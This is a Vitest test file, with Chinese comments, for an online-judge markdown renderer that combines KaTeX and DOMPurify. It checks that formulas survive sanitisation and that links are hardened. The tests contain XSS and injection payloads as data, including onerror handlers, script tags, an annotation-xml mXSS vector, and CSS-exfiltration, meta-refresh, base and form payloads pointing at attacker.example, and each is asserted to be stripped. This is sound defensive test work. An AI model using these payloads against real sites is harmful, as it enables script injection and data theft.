// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import DOMPurify from 'dompurify'
import { renderMarkdown } from '@/utils/markdown'

/**
 * 生产路径（真实 DOM）下的公式渲染契约。
 *
 * markdown.spec.ts 运行在 Node（无 DOM）——DOMPurify.isSupported === false，
 * 消毒被跳过，只锁「marked + KaTeX」渲染段。本文件运行在 jsdom，消毒必然生效，
 * 完整走「KaTeX 渲染 → DOMPurify 消毒 → URL 改写」链路，锁定 WebView 中的实际输出。
 * 消毒是历史上最易出错的环节（白名单差一个标签，公式就碎成乱码），必须独立锁定。
 */
describe('renderMarkdown — 生产路径（DOMPurify 消毒激活）', () => {
  it('前置：本环境 DOMPurify 生效（否则本文件失去意义）', () => {
    expect(DOMPurify.isSupported).toBe(true)
  })

  it('行内公式消毒后完整存活（视觉树 katex-html 保留）', () => {
    const html = renderMarkdown('保证$1 \\le n \\le 10^5$成立', '')
    expect(html).toContain('class="katex"')
    // 视觉渲染依赖的定位内联样式必须保留（strut/vlist 撑起上下标）
    expect(html).toMatch(/style="[^"]*height:/)
  })

  it('块级公式消毒后保留 katex-display（可横向滚动的全局样式锚点）', () => {
    const html = renderMarkdown('$$\n\\sum_{i=1}^{n} i = \\frac{n(n+1)}{2}\n$$', '')
    expect(html).toContain('katex-display')
    expect(html).toContain('class="katex"')
  })

  it('MathML 无障碍树完整保留（semantics/annotation 及 encoding 属性）', () => {
    const html = renderMarkdown('设 $x_1$ 为变量', '')
    expect(html).toContain('<semantics>')
    expect(html).toContain('<annotation encoding="application/x-tex">x_1</annotation>')
  })

  it('可伸缩根号/括号走 svg 档，消毒后 svg 路径保留', () => {
    const html = renderMarkdown('$$\\sqrt{\\frac{n(n+1)}{2}}$$', '')
    expect(html).toContain('<svg')
    expect(html).toContain('katex-display')
  })

  it('公式与恶意内联 HTML 共存时消毒不失效（script/onerror 必须被剥）', () => {
    const html = renderMarkdown(
      '<img src=x onerror=alert(1)>\n\n$\\frac{a}{b}$\n\n<script>evil()</script>',
      '',
    )
    expect(html).not.toContain('<script')
    expect(html).not.toContain('onerror')
    expect(html).toContain('class="katex"')
  })

  it('mXSS 载体 <annotation-xml encoding="text/html"> 整体被拒（mathMl 档不放行）', () => {
    // annotation-xml 是 MathML 结构的一部分，但也是经典 mXSS 载体：其
    // encoding 指向 HTML 时下游解析会切回 HTML 模式，内嵌载荷借
    // foreign-content 解析差异复活。ADD_TAGS 刻意只补纯文本的
    // semantics/annotation（LaTeX 无障碍树够用），annotation-xml 连同
    // 子树整体剥除。未来若为「修公式」把它补进白名单，本用例即红。
    // 载荷取 mid-body 形态（与下方样式/表单用例同理：题面天然位置）。
    const payload =
      '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>'
    const html = renderMarkdown(`正文段 $a+b$ 先行\n\n${payload}\n\n尾段`, '')
    expect(html).not.toContain('annotation-xml')
    expect(html).not.toContain('text/html')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('onerror')
    // <math> 本身在 mathMl 档内保留；存活锚点防空窗假绿
    expect(html).toContain('<math')
    expect(html).toContain('class="katex"')
    expect(html).toContain('正文段')
    expect(html).toContain('尾段')
  })

  it('文档级样式与表单注入面封闭：<style>/<link>/<meta refresh>/<base>/<form> 必须被剥（mid-body 形态）', () => {
    // 载荷必须 mid-body（正文在前、载荷在后）——题面天然形态，也是 marked
    // 的真实输出位置。置于片段开头时 <style> 被 HTML 解析器归入 <head>，
    // WHOLE_DOCUMENT=false 只处理 body，元素静默消失只是**位置伪象**而非
    // 白名单剥除（实测：leading 剥除、mid-body 存活）。
    // 机制分工：<style> 由 FORBID_TAGS 显式禁（html 档白名单实际含 style）；
    // <link>/<meta>/<base> 不在档内、白名单剥；<form> 由 FORBID_TAGS 显式禁
    // （html 档白名单含 form 且**外域 action 原样保留**——拦截器只拦锚点、
    // Rust 无 on_navigation，外域提交被 CSP form-action 拦下后残余是整页重载
    // 丢草稿，实测）。危害面：伪造弹窗、CSS 外泄、远程
    // 样式表、导航劫持、表单提交。未来若移除 FORBID_TAGS 或误放行，本用例即红。
    const payload = [
      '<style>input[value^=a]{background:url(http://attacker.example/a)}</style>',
      '<link rel="stylesheet" href="http://attacker.example/x.css">',
      '<meta http-equiv="refresh" content="0;url=http://attacker.example/">',
      '<base href="http://attacker.example/">',
      '<form action="http://attacker.example/steal"><input name=q><button>go</button></form>',
    ].join('')
    const html = renderMarkdown(`正文段 $a+b$ 先行\n\n${payload}\n\n尾段`, '')
    expect(html).not.toContain('<style')
    expect(html).not.toContain('<link')
    expect(html).not.toContain('<meta')
    expect(html).not.toContain('<base')
    expect(html).not.toContain('<form')
    expect(html).not.toContain('attacker.example')
    // form 不在 DEFAULT_FORBID_CONTENTS：FORBID 剥标签**保子内容**——
    // 表现性保真（input/button 照常渲染，仅失去提交路径）
    expect(html).toContain('<input name="q">')
    expect(html).toContain('<button>go</button>')
    // 存活锚点：消毒链路确实跑过且首尾正文与公式照常渲染（防空窗假绿）
    expect(html).toContain('class="katex"')
    expect(html).toContain('正文段')
    expect(html).toContain('尾段')
  })

  it('消毒与相对图片 URL 改写共存（生产组合行为）', () => {
    const html = renderMarkdown(
      '![图](/api/public/img/a.png)\n\n其中 $a_i \\ge 0$',
      'https://oj.example.com',
    )
    expect(html).toContain('src="https://oj.example.com/api/public/img/a.png"')
    expect(html).toContain('class="katex"')
  })

  it('外链锚点加固：target=_blank + rel=noopener noreferrer（外链 fail-safe）', () => {
    const html = renderMarkdown('[勘误](https://errata.example.com/a1)', 'https://oj.example.com')
    expect(html).toContain('href="https://errata.example.com/a1"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it('OJ 相对地址改写后的链接同样加固（与图片改写同链路）', () => {
    const html = renderMarkdown('[题目页](/api/problem/1)', 'https://oj.example.com')
    expect(html).toContain('href="https://oj.example.com/api/problem/1"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it('单引号/无引号属性里的相对地址同样改写并加固（消毒会归一化引号）', () => {
    // 手写 HTML 常用单引号；改写走消毒钩子的属性遍历，三种引号写法都能覆盖
    // （字符串正则按引号形态匹配，曾在单/无引号与正文同形字面量上出错）
    const single = renderMarkdown("<a href='/api/problem/1'>题目页</a>", 'https://oj.example.com')
    expect(single).toContain('href="https://oj.example.com/api/problem/1"')
    expect(single).toContain('target="_blank"')

    const unquoted = renderMarkdown('<img src=/api/public/img/b.png>', 'https://oj.example.com')
    expect(unquoted).toContain('src="https://oj.example.com/api/public/img/b.png"')
  })

  it('围栏代码块/行内代码/正文里的同形字面量不被改写（属性级改写，非字符串正则）', () => {
    // 回归锁：字符串正则会把这些文本当成属性改写，还会把转义的 &gt; 吞进 URL
    const fenced = renderMarkdown(
      '```html\n<img src=/api/public/img/a.png>\n```',
      'https://oj.example.com',
    )
    expect(fenced).toContain('&lt;img src=/api/public/img/a.png&gt;')
    expect(fenced).not.toContain('https://oj.example.com')

    const inline = renderMarkdown('写法是 `href=/api/x` 表示相对地址', 'https://oj.example.com')
    expect(inline).toContain('<code>href=/api/x</code>')
    expect(inline).not.toContain('https://oj.example.com')

    const prose = renderMarkdown(
      '请把 src=/api/x 改成绝对路径，例如 href="/api/y"',
      'https://oj.example.com',
    )
    expect(prose).toContain('src=/api/x')
    expect(prose).toContain('href="/api/y"')
    expect(prose).not.toContain('https://oj.example.com')
  })

  it('危险 baseUrl scheme 不参与改写（消毒后改属性的注入面）', () => {
    const html = renderMarkdown('![x](/api/public/img/a.png)', 'javascript:alert(1)')
    expect(html).toContain('src="/api/public/img/a.png"')
    expect(html).not.toContain('javascript:alert(1)')
  })

  it('空 href 变成占位链接（`[x]()`：无 href/target/rel）', () => {
    // 空 href 解析后等于当前文档 URL，点击会整页重载（丢防抖内的草稿）；
    // 渲染成不可点占位链接，比「可点但没反应」更诚实
    const html = renderMarkdown('[x]()', 'https://oj.example.com')
    expect(html).toContain('<a>x</a>')
    expect(html).not.toContain('href=')
    expect(html).not.toContain('target=')
    expect(html).not.toContain('rel=')
  })

  it('纯空白 href 同样变成占位链接（`<a href=" ">`）', () => {
    const html = renderMarkdown('<a href=" ">x</a>', 'https://oj.example.com')
    expect(html).toContain('<a>x</a>')
    expect(html).not.toContain('href=')
  })

  it('`#` 片段锚点不加固（站内跳转必须留在当前页）', () => {
    const html = renderMarkdown('[跳到提示](#hint)', 'https://oj.example.com')
    expect(html).toContain('href="#hint"')
    expect(html).not.toContain('target="_blank"')
    expect(html).not.toContain('rel="noopener')
  })

  it('同 host 链接不加固（站内跳转保留默认导航）', () => {
    const origin = window.location.origin
    const html = renderMarkdown(`[题目列表](${origin}/contest/problems)`, 'https://oj.example.com')
    expect(html).toContain(`href="${origin}/contest/problems"`)
    expect(html).not.toContain('target="_blank"')
    expect(html).not.toContain('rel="noopener')
  })

  it('mailto 链接不加固（非 http(s)，交给默认处理器）', () => {
    const html = renderMarkdown('[邮件](mailto:judge@example.com)', '')
    expect(html).toContain('href="mailto:judge@example.com"')
    expect(html).not.toContain('target="_blank"')
    expect(html).not.toContain('rel="noopener')
  })

  it('加固钩子只作用于局部实例，不污染全局 DOMPurify', () => {
    // 若钩子挂在全局单例上，应用里其它 sanitize 调用会无辜多出 target/rel
    const html = DOMPurify.sanitize('<a href="https://errata.example.com/a1">勘误</a>')
    expect(html).toContain('href="https://errata.example.com/a1"')
    expect(html).not.toContain('target=')
    expect(html).not.toContain('rel=')
  })

  it('出错公式消毒后错误文本与 errorColor 内联样式保留（可见降级）', () => {
    const html = renderMarkdown('$\\frac{$', '')
    expect(html).toContain('katex-error')
    expect(html).toMatch(/style="color:#dc2626"/)
  })

  it('消毒后容器 + 恶意内联 HTML 共存时 script 仍被剥', () => {
    const html = renderMarkdown(
      '::: hljs-center\n$$\ne^{e^x}\n$$\n:::\n\n<script>evil()</script>',
      '',
    )
    expect(html).toContain('<div class="hljs-center">')
    expect(html).not.toContain('<script')
  })

  it('Vditor 容器 div 与类名消毒后保留（居中公式完整链路）', () => {
    const html = renderMarkdown('::: hljs-center\n$$\nh(x)=e^{e^x}\n$$\n:::', '')
    expect(html).toContain('<div class="hljs-center">')
    expect(html).toContain('katex-display')
    expect(html).toContain('class="katex"')
  })
})

/**
 * 表现性 HTML 标记的保真渲染契约 —— 消毒只为安全剥（脚本/事件），作者排版
 * （<big>/<font>/<center>，CF 导入题源惯例）必须原样保留，与 HOJ 网页端一致。
 */
describe('renderMarkdown — 表现性标记保真渲染', () => {
  it('<big> 原样保留（作者字号意图，浏览器 +1 档渲染）', () => {
    const html = renderMarkdown('<big>后续文字</big>。', '')
    expect(html).toContain('<big>后续文字</big>')
  })

  it('<font size/color> 标签与属性原样保留', () => {
    const html = renderMarkdown('<font size="5" color="red">强调文字</font>', '')
    expect(html).toContain('<font size="5" color="red">强调文字</font>')
  })

  it('安全威胁仍被剥：script/onerror 与保真渲染并存', () => {
    const html = renderMarkdown('<big>文字</big><script>evil()</script>', '')
    expect(html).toContain('<big>文字</big>')
    expect(html).not.toContain('<script')
  })

  it('真实 CF 风格数据端到端：big 保真 + 容器公式渲染互不干扰', () => {
    // 来自实际题面的结构：容器内 \huge 公式 + <big> 包裹的后续段落（含 \large 行内公式）
    const html = renderMarkdown(
      '::: hljs-center\n\n' + '${\\huge h\\left ( x \\right ) = e^{e^{x}  }}$' + '\n:::\n\n' +
        '<big>输出结果至少有 ${\\large n}$ 位数字。</big>',
      '',
    )
    expect(html).toContain('<div class="hljs-center">')
    expect(html).toContain('class="katex"')
    expect(html).toContain('<big>')
    expect(html).toContain('位数字')
  })
})
